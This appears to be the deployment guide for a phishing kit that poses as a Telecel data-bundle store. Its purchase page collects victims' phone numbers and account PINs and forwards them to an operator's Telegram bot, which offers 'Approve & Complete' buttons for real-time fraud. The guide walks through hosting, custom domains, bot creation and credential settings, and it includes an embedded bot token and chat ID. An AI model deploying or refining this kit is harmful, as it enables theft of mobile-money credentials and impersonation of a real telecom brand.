# Telecel Website - Deployment Guide

## 📦 What's Included

```
telecel_static_site/
├── index.html          (Main homepage - 25 KB)
├── login.html          (Purchase page - 21 KB)
├── verify.html         (Confirmation page - 8.6 KB)
├── README.md           (Documentation)
└── DEPLOYMENT_GUIDE.md (This file)
```

**Total Size**: ~60 KB (extremely lightweight)

## 🌐 Deployment Options

### Option 1: Netlify (Recommended - Free)

1. Go to [netlify.com](https://netlify.com)
2. Sign up with GitHub/Google
3. Click "Add new site" → "Deploy manually"
4. Drag and drop the `telecel_static_site` folder
5. Your site is live instantly!

**Advantages:**
- Free SSL certificate
- CDN included
- Custom domain support
- Automatic deploys from Git

### Option 2: Vercel (Free)

1. Go to [vercel.com](https://vercel.com)
2. Sign up with GitHub/Google
3. Click "New Project" → "Import"
4. Upload the folder
5. Deploy

**Advantages:**
- Blazing fast performance
- Free SSL
- Analytics included
- Easy rollbacks

### Option 3: GitHub Pages (Free)

1. Create a GitHub repository
2. Upload all files to the `main` branch
3. Go to Settings → Pages
4. Select "Deploy from a branch" → main
5. Your site is live at `username.github.io/telecel`

**Advantages:**
- Completely free
- No build process needed
- Version control included

### Option 4: Traditional Web Hosting (cPanel, etc.)

1. Extract the zip file
2. Connect via FTP
3. Upload all files to `public_html` folder
4. Done!

**Advantages:**
- Works with any hosting provider
- Full control
- Can add backend later

### Option 5: AWS S3 + CloudFront (Scalable)

1. Create S3 bucket
2. Enable static website hosting
3. Upload files
4. Create CloudFront distribution
5. Point domain to CloudFront

**Advantages:**
- Highly scalable
- Global CDN
- Pay-as-you-go pricing

## 🔧 Pre-Deployment Checklist

Before deploying, verify:

- [ ] **Telegram Bot Token** is correct in `login.html` (line 171)
- [ ] **Chat ID** is correct in `login.html` (line 172)
- [ ] **Domain name** is set up (if using custom domain)
- [ ] **HTTPS** is enabled (most hosts do this automatically)
- [ ] **All files** are included (index.html, login.html, verify.html)

## 🔐 Telegram Bot Setup

### Step 1: Create Bot with BotFather

1. Open Telegram and search for [@BotFather](https://t.me/botfather)
2. Send `/start`
3. Send `/newbot`
4. Follow the prompts to name your bot
5. Copy the **Bot Token** (looks like: `123456789:ABCDefGHIjklMNOpqrsTUVwxyz`)

### Step 2: Get Your Chat ID

1. Send a message to your newly created bot
2. Visit this URL (replace YOUR_BOT_TOKEN):
   ```
   https://api.telegram.org/botYOUR_BOT_TOKEN/getUpdates
   ```
3. Look for `"chat":{"id":123456789}`
4. Copy that number (your **Chat ID**)

### Step 3: Update login.html

Open `login.html` and find (around line 171):

```javascript
const CONFIG = {
    BOT_TOKEN: '8625776173:AAE9XuhbvCy-Gp2d7GAbWLSp4c2sDUtExkw',  // ← Replace
    CHAT_ID: '6573120346',                                          // ← Replace
    MIN_PHONE_LENGTH: 10,
    REDIRECT_PAGE: 'verify.html'
};
```

Replace with your actual values.

## 🚀 After Deployment

### Test the Complete Flow

1. **Visit Homepage**
   - Open your deployed site
   - Verify all bundles display correctly
   - Test FAQ accordion
   - Check responsive design on mobile

2. **Test Purchase Flow**
   - Click "Buy Now" on any bundle
   - Verify bundle info displays on login page
   - Enter test credentials:
     - Account Type: Mobile
     - Phone: 0201234567
     - PIN: 1234
   - Click "Complete Purchase"

3. **Verify Telegram Integration**
   - Check your Telegram bot chat
   - You should receive a message with purchase details
   - Two buttons should appear: "Approve & Complete" and "Decline"
   - Click "Approve & Complete"
   - Page should redirect to verification page

4. **Check Verification Page**
   - Verify purchase details display
   - Test "Download Receipt" button
   - Test "Back to Bundles" link

### Monitor Performance

- Check page load time (should be < 1 second)
- Test on different browsers
- Test on mobile devices
- Monitor Telegram message delivery

## 📊 Performance Metrics

Your site should achieve:

- **Page Load**: < 1 second
- **Lighthouse Score**: 95+
- **Mobile Score**: 90+
- **File Size**: ~60 KB total

## 🔍 SEO Optimization

The site includes:

- ✅ Proper HTML5 structure
- ✅ Meta tags for mobile
- ✅ Semantic HTML
- ✅ Fast loading
- ✅ Mobile responsive

To further optimize:

1. Add Google Analytics
2. Create sitemap.xml
3. Add robots.txt
4. Submit to Google Search Console

## 🛡️ Security Recommendations

1. **Use HTTPS** (all modern hosts provide free SSL)
2. **Keep bot token private** (don't commit to public repos)
3. **Validate on backend** (for production, add server-side validation)
4. **Rate limit** Telegram API calls (prevent abuse)
5. **Monitor logs** for suspicious activity

## 📱 Custom Domain Setup

### For Netlify:
1. Go to Site settings → Domain management
2. Click "Add custom domain"
3. Enter your domain
4. Update DNS records as instructed

### For Vercel:
1. Go to Settings → Domains
2. Add your domain
3. Update DNS records

### For GitHub Pages:
1. Create `CNAME` file with your domain
2. Update DNS CNAME record to `username.github.io`

## 🆘 Troubleshooting

### Site Not Loading

- [ ] Check all files are uploaded
- [ ] Verify file names are correct (case-sensitive)
- [ ] Check browser console for errors
- [ ] Clear browser cache

### Telegram Messages Not Sending

- [ ] Verify bot token is correct
- [ ] Verify chat ID is correct
- [ ] Check Telegram API is accessible
- [ ] Look at browser console errors

### Bundle Info Not Showing

- [ ] Verify URL has `?bundle=` and `?price=` parameters
- [ ] Check browser console for JavaScript errors
- [ ] Test with: `login.html?bundle=10gb&price=10`

### Redirect Not Working

- [ ] Verify `verify.html` file exists
- [ ] Check file path in `login.html` (line 174)
- [ ] Verify localStorage is enabled in browser

## 📞 Support

For issues:

1. Check browser console (F12 → Console tab)
2. Check network tab for failed requests
3. Verify Telegram bot is working
4. Test with different browser

## 📈 Scaling Tips

For high traffic:

1. Use a CDN (CloudFlare, Cloudfront)
2. Enable caching headers
3. Minify CSS/JS (optional, already optimized)
4. Add rate limiting to Telegram API calls
5. Consider backend for payment processing

## 🔄 Maintenance

- [ ] Monitor Telegram bot status
- [ ] Check error logs weekly
- [ ] Update bundle prices as needed
- [ ] Test purchase flow monthly
- [ ] Keep backups of configuration

## 📋 Deployment Checklist

- [ ] All files extracted
- [ ] Telegram credentials updated
- [ ] Domain configured
- [ ] HTTPS enabled
- [ ] Files uploaded
- [ ] Homepage loads
- [ ] Bundles display correctly
- [ ] Purchase flow tested
- [ ] Telegram integration verified
- [ ] Verification page working
- [ ] Mobile responsive verified

---

**Deployment Time**: 5-15 minutes  
**Difficulty**: Easy  
**No coding required**: ✅

Good luck! 🚀
